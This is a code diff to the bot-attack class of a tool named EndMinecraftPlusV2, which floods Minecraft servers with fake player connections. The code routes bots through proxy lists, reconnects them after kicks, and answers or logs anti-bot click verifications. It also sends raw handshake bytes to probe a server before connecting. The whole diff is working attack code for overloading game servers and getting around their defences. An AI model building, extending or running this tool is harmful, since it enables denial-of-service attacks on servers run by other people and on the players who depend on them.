@@ -6,6 +6,7 @@ import cn.serendipityr.EndMinecraftPlusV2.VersionControl.*;
 import cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ACProtocol.AnotherStarAntiCheat;
 import cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ACProtocol.AntiCheat3;
 import cn.serendipityr.EndMinecraftPlusV2.VersionControl.NewVersion.ForgeProtocol.MCForge;
+import com.github.steveice10.mc.protocol.data.message.Message;
 import com.github.steveice10.mc.protocol.packet.ingame.client.ClientChatPacket;
 import com.github.steveice10.mc.protocol.packet.ingame.client.ClientKeepAlivePacket;
 import com.github.steveice10.mc.protocol.packet.ingame.client.ClientPluginMessagePacket;
@@ -31,7 +32,6 @@ import net.kyori.adventure.text.Component;
 import net.kyori.adventure.text.serializer.gson.GsonComponentSerializer;
 import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;
 
-import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.InetSocketAddress;
 import java.net.Proxy;
@@ -43,10 +43,11 @@ import java.util.concurrent.Executors;
 public class NewBotAttack extends IAttack {
     public static HashMap<Session, String> clientName = new HashMap<>();
     public static int failed = 0;
-    public static int joined = 0;
     public static int rejoin = 0;
     public static int clickVerifies = 0;
     public static List<String> alivePlayers = new ArrayList<>();
+    public static List<String> rejoinPlayers = new ArrayList<>();
+    public static List<Session> joinedPlayers = new ArrayList<>();
     public static HashMap<Session,ServerPlayerPositionRotationPacket> positionPacket = new HashMap<>();
     public static HashMap<Session,ClientboundPlayerPositionPacket> newPositionPacket = new HashMap<>();
     protected boolean attack_motdbefore;
@@ -153,8 +154,6 @@ public class NewBotAttack extends IAttack {
                         }
                     }
                 }
-
-                OtherUtils.doSleep(1000);
             }
         });
 
@@ -186,7 +185,7 @@ public class NewBotAttack extends IAttack {
             tabThread = new Thread(() -> {
                 while (true) {
                     for (Session c : clients) {
-                        if (c.isConnected() && c.hasFlag("join")) {
+                        if (c.isConnected() && c.hasFlag("login")) {
                             if (ProtocolLibs.adaptAfter758) {
                                 VersionSupport758.sendTabPacket(c, "/");
                             } else {
@@ -225,11 +224,14 @@ public class NewBotAttack extends IAttack {
             String username = clientName.get(client);
 
             if (!client.isConnected()) {
+                positionPacket.remove(client);
                 alivePlayers.remove(username);
                 clientName.remove(client);
                 clients.remove(client);
-            } else if (!alivePlayers.contains(username) && (client.hasFlag("login") || client.hasFlag("join"))) {
-                alivePlayers.add(username);
+            } else {
+                if (!alivePlayers.contains(username) && (client.hasFlag("login") || client.hasFlag("join"))) {
+                    alivePlayers.add(username);
+                }
             }
         }
     }
@@ -247,47 +249,41 @@ public class NewBotAttack extends IAttack {
                 break;
         }
 
-        boolean run = true;
-        while (run) {
-            for (String p: ProxyUtil.proxies) {
-                try {
-                    if (!EndMinecraftPlusV2.isLinux) {
-                        SetTitle.INSTANCE.SetConsoleTitleA("EndMinecraftPlusV2 - BotAttack | 当前连接数: " + clients.size() + "个 | 失败次数: " + failed + "次 | 成功加入: " + joined + "次 | 当前存活: " + alivePlayers.size() + "个 | 点击验证: " + clickVerifies + "次 | 重进尝试: " + rejoin);
-                    }
-
-                    String[] _p = p.split(":");
-                    Proxy proxy = new Proxy(proxyType, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
-                    String[] User = AttackManager.getRandomUser().split("@");
-                    Session client = createClient(ip, port, User[0], proxy);
-                    client.setReadTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));
-                    client.setWriteTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));
-                    clientName.put(client, User[0]);
-                    clients.add(client);
-                    ProxyUtil.clientsProxy.put(client, proxy);
-
-                    if (this.attack_motdbefore) {
-                        pool.submit(() -> {
-                            getMotd(proxy, ip, port);
-                            client.connect(false);
-                        });
-                    } else {
-                        client.connect(false);
-                    }
-
-                    if (this.attack_joinsleep > 0) {
-                        OtherUtils.doSleep(attack_joinsleep);
-                    }
-
-                    if (clients.size() > this.attack_maxconnect) {
-                        run = false;
-                        break;
-                    }
-                } catch (Exception e) {
-                    LogUtil.doLog(1, "发生错误: " + e, null);
+        for (String p: ProxyUtil.proxies) {
+            try {
+                if (!EndMinecraftPlusV2.isLinux) {
+                    SetTitle.INSTANCE.SetConsoleTitleA("EndMinecraftPlusV2 - BotAttack | 当前连接数: " + clients.size() + "个 | 失败次数: " + failed + "次 | 成功加入: " + joinedPlayers.size() + "次 | 当前存活: " + alivePlayers.size() + "个 | 点击验证: " + clickVerifies + "次 | 重进尝试: " + rejoin);
                 }
+
+                String[] _p = p.split(":");
+                Proxy proxy = new Proxy(proxyType, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
+                String[] User = AttackManager.getRandomUser().split("@");
+                Session client = createClient(ip, port, User[0], proxy);
+                client.setReadTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));
+                client.setWriteTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));
+                clientName.put(client, User[0]);
+                clients.add(client);
+                ProxyUtil.clientsProxy.put(client, proxy);
+
+                pool.submit(() -> {
+                    if (this.attack_motdbefore) {
+                        getMotd(proxy, ip, port);
+                    }
+
+                    client.connect(false);
+                });
+
+                if (this.attack_joinsleep > 0) {
+                    OtherUtils.doSleep(attack_joinsleep);
+                }
+
+                if (clients.size() > this.attack_maxconnect) {
+                    break;
+                }
+            } catch (Exception e) {
+                LogUtil.doLog(1, "发生错误: " + e, null);
             }
         }
-
     }
 
     public Session createClient(final String ip, int port, final String username, Proxy proxy) {
@@ -327,10 +323,6 @@ public class NewBotAttack extends IAttack {
                         handlePacket(e.getSession(), e.getPacket(), username);
                     }
                 }).start();
-
-                if (ConfigUtil.SaveWorkingProxy) {
-                    ProxyUtil.saveWorkingProxy(proxy);
-                }
             }
 
             public void packetReceived(Session session, Packet packet) {
@@ -341,10 +333,6 @@ public class NewBotAttack extends IAttack {
                         handlePacket(session, packet, username);
                     }
                 }).start();
-
-                if (ConfigUtil.SaveWorkingProxy) {
-                    ProxyUtil.saveWorkingProxy(proxy);
-                }
             }
 
             public void packetSending(PacketSendingEvent packetSendingEvent) {
@@ -364,31 +352,36 @@ public class NewBotAttack extends IAttack {
             }
 
             public void connected(ConnectedEvent e) {
+                if (ConfigUtil.SaveWorkingProxy) {
+                    ProxyUtil.saveWorkingProxy(proxy);
+                }
             }
 
             public void disconnecting(DisconnectingEvent e) {
             }
 
             public void disconnected(DisconnectedEvent e) {
-                String msg;
+                new Thread(() -> {
+                    String msg;
 
-                if (e.getCause() == null) {
-                    msg = e.getReason();
+                    if (e.getCause() == null) {
+                        msg = e.getReason();
 
-                    if (ProtocolLibs.adaptAfter754) {
-                        Component component = GsonComponentSerializer.gson().deserialize(msg);
-                        msg = PlainTextComponentSerializer.plainText().serialize(component);
-                    }
+                        if (ProtocolLibs.adaptAfter754) {
+                            Component component = GsonComponentSerializer.gson().deserialize(msg);
+                            msg = PlainTextComponentSerializer.plainText().serialize(component);
+                        }
 
-                    LogUtil.doLog(0,"[假人断开连接] [" + username + "] " + msg, "BotAttack");
+                        LogUtil.doLog(0,"[假人断开连接] [" + username + "] " + msg, "BotAttack");
 
-                    if (ConfigUtil.SaveWorkingProxy) {
-                        ProxyUtil.saveWorkingProxy(proxy);
-                    }
+                        for (String rejoinDetect:ConfigUtil.RejoinDetect) {
+                            if (rejoinPlayers.contains(username)) {
+                                break;
+                            }
 
-                    for (String rejoinDetect:ConfigUtil.RejoinDetect) {
-                        if (msg.contains(rejoinDetect)) {
-                            new Thread(() -> {
+                            if (msg.contains(rejoinDetect)) {
+                                rejoinPlayers.add(username);
+
                                 for (int i = 0; i < ConfigUtil.RejoinCount; i++) {
                                     OtherUtils.doSleep(ConfigUtil.RejoinDelay);
 
@@ -401,24 +394,24 @@ public class NewBotAttack extends IAttack {
                                     clientName.put(rejoinClient, username);
                                     clients.add(rejoinClient);
                                     rejoinClient.connect(false);
+                                    ProxyUtil.clientsProxy.put(client, proxy);
 
                                     if (rejoinClient.hasFlag("join") || rejoinClient.hasFlag("login")) {
+                                        rejoinPlayers.remove(username);
                                         break;
                                     }
                                 }
-                            }).start();
+
+                                rejoinPlayers.remove(username);
+                            }
                         }
+                    } else if (ConfigUtil.ShowFails) {
+                        LogUtil.doLog(0,"[假人断开连接] [" + username + "] " + e.getCause(), "BotAttack");
                     }
-                } else if (ConfigUtil.ShowFails) {
-                    //msg = e.getCause().getMessage();
-                    LogUtil.doLog(0,"[假人断开连接] [" + username + "] " + e.getCause(), "BotAttack");
-                }
 
-                failed++;
-                alivePlayers.remove(username);
-
-                client.disconnect("");
-                clients.remove(client);
+                    failed++;
+                    alivePlayers.remove(username);
+                }).start();
             }
         });
         return client;
@@ -428,22 +421,14 @@ public class NewBotAttack extends IAttack {
         try {
             Socket socket = new Socket(proxy);
             socket.connect(new InetSocketAddress(ip, port));
+
             if (socket.isConnected()) {
                 OutputStream out = socket.getOutputStream();
-                InputStream in = socket.getInputStream();
                 out.write(new byte[]{0x07, 0x00, 0x05, 0x01, 0x30, 0x63, (byte) 0xDD, 0x01});
                 out.write(new byte[]{0x01, 0x00});
                 out.flush();
-                in.read();
-
-                try {
-                    in.close();
-                    out.close();
-                    socket.close();
-                } catch (Exception ignored) {}
-
-                return;
             }
+
             socket.close();
         } catch (Exception ignored) {}
     }
@@ -471,7 +456,7 @@ public class NewBotAttack extends IAttack {
         } else if (recvPacket instanceof ServerJoinGamePacket) {
             session.setFlag("join", true);
             LogUtil.doLog(0, "[假人加入服务器] [" + username + "]", "BotAttack");
-            joined++;
+            joinedPlayers.add(session);
 
             if (!alivePlayers.contains(username)) {
                 alivePlayers.add(username);
@@ -490,20 +475,24 @@ public class NewBotAttack extends IAttack {
 
         } else if (recvPacket instanceof ServerChatPacket) {
             ServerChatPacket chatPacket = (ServerChatPacket) recvPacket;
+            Message message = chatPacket.getMessage();
+            Map<String, String> result = VersionSupport754.clickVerifiesHandle(chatPacket, session, ConfigUtil.ClickVerifiesDetect, null);
 
-            if (ProtocolLibs.adaptAfter754) {
-                List<String> result = VersionSupport754.clickVerifiesHandle(chatPacket, session, ConfigUtil.ClickVerifiesDetect, null);
+            if (result.get("result").contains("true")) {
+                LogUtil.doLog(0, "[服务端返回验证信息] [" + username + "] " + result.get("msg"), "BotAttack");
+                clickVerifies++;
+            }
 
-                if (result.get(0).equals("1")) {
-                    LogUtil.doLog(0, "[服务端返回验证信息] [" + username + "] " + result.get(2), "BotAttack");
-                    clickVerifies++;
-                } else if (!result.get(1).equals("")) {
-                    LogUtil.doLog(0, "[服务端返回信息] [" + username + "] " + result.get(1), "BotAttack");
-                }
+            if (!joinedPlayers.contains(session)) {
+                joinedPlayers.add(session);
+            }
 
-                if (!alivePlayers.contains(username)) {
-                    alivePlayers.add(username);
-                }
+            if (!alivePlayers.contains(username)) {
+                alivePlayers.add(username);
+            }
+
+            if (ConfigUtil.ShowServerMessages && !message.getText().equals("")) {
+                LogUtil.doLog(0, "[服务端返回信息] [" + username + "] " + message.getFullText(), "BotAttack");
             }
         } else if (recvPacket instanceof ServerKeepAlivePacket) {
             ClientKeepAlivePacket keepAlivePacket = new ClientKeepAlivePacket(((ServerKeepAlivePacket) recvPacket).getPingId());
@@ -535,7 +524,7 @@ public class NewBotAttack extends IAttack {
         } else if (recvPacket instanceof ClientboundLoginPacket) {
             session.setFlag("join", true);
             LogUtil.doLog(0, "[假人加入服务器] [" + username + "]", "BotAttack");
-            joined++;
+            joinedPlayers.add(session);
 
             if (!alivePlayers.contains(username)) {
                 alivePlayers.add(username);
@@ -558,43 +547,61 @@ public class NewBotAttack extends IAttack {
                 newPositionPacket.put(session,packet);
             } catch (Exception ignored) {}
         } else if (ProtocolLibs.adaptAfter760 && VersionSupport760.checkServerChatPacket(recvPacket)) {
-            List<String> result = VersionSupport760.clickVerifiesHandle(recvPacket, session, ConfigUtil.ClickVerifiesDetect, null);
+            Map<String, String> result = VersionSupport760.clickVerifiesHandle(recvPacket, session, ConfigUtil.ClickVerifiesDetect, null);
 
-            if (result.get(0).equals("1")) {
-                LogUtil.doLog(0, "[服务端返回验证信息] [" + username + "] " + result.get(2), "BotAttack");
+            if (result.get("result").contains("true")) {
+                LogUtil.doLog(0, "[服务端返回验证信息] [" + username + "] " + result.get("msg"), "BotAttack");
                 clickVerifies++;
-            } else if (!result.get(1).equals("")) {
-                LogUtil.doLog(0, "[服务端返回信息] [" + username + "] " + result.get(1), "BotAttack");
+            }
+
+            if (!joinedPlayers.contains(session)) {
+                joinedPlayers.add(session);
             }
 
             if (!alivePlayers.contains(username)) {
                 alivePlayers.add(username);
+            }
+
+            if (ConfigUtil.ShowServerMessages) {
+                LogUtil.doLog(0, "[服务端返回信息] [" + username + "] " + result.get("msg"), "BotAttack");
             }
         } else if (VersionSupport759.checkServerChatPacket(recvPacket)) {
-            List<String> result = VersionSupport759.clickVerifiesHandle(recvPacket, session, ConfigUtil.ClickVerifiesDetect, null);
+            Map<String, String> result = VersionSupport759.clickVerifiesHandle(recvPacket, session, ConfigUtil.ClickVerifiesDetect, null);
 
-            if (result.get(0).equals("1")) {
-                LogUtil.doLog(0, "[服务端返回验证信息] [" + username + "] " + result.get(2), "BotAttack");
+            if (result.get("result").contains("true")) {
+                LogUtil.doLog(0, "[服务端返回验证信息] [" + username + "] " + result.get("msg"), "BotAttack");
                 clickVerifies++;
-            } else if (!result.get(1).equals("")) {
-                LogUtil.doLog(0, "[服务端返回信息] [" + username + "] " + result.get(1), "BotAttack");
+            }
+
+            if (!joinedPlayers.contains(session)) {
+                joinedPlayers.add(session);
             }
 
             if (!alivePlayers.contains(username)) {
                 alivePlayers.add(username);
+            }
+
+            if (ConfigUtil.ShowServerMessages) {
+                LogUtil.doLog(0, "[服务端返回信息] [" + username + "] " + result.get("msg"), "BotAttack");
             }
         } else if (VersionSupport758.checkServerChatPacket(recvPacket)) {
-            List<String> result = VersionSupport758.clickVerifiesHandle(recvPacket, session, ConfigUtil.ClickVerifiesDetect, null);
+            Map<String, String> result = VersionSupport758.clickVerifiesHandle(recvPacket, session, ConfigUtil.ClickVerifiesDetect, null);
 
-            if (result.get(0).equals("1")) {
-                LogUtil.doLog(0, "[服务端返回验证信息] [" + username + "] " + result.get(2), "BotAttack");
+            if (result.get("result").contains("true")) {
+                LogUtil.doLog(0, "[服务端返回验证信息] [" + username + "] " + result.get("msg"), "BotAttack");
                 clickVerifies++;
-            } else if (!result.get(1).equals("")) {
-                LogUtil.doLog(0, "[服务端返回信息] [" + username + "] " + result.get(1), "BotAttack");
+            }
+
+            if (!joinedPlayers.contains(session)) {
+                joinedPlayers.add(session);
             }
 
             if (!alivePlayers.contains(username)) {
                 alivePlayers.add(username);
+            }
+
+            if (ConfigUtil.ShowServerMessages) {
+                LogUtil.doLog(0, "[服务端返回信息] [" + username + "] " + result.get("msg"), "BotAttack");
             }
         }
     }
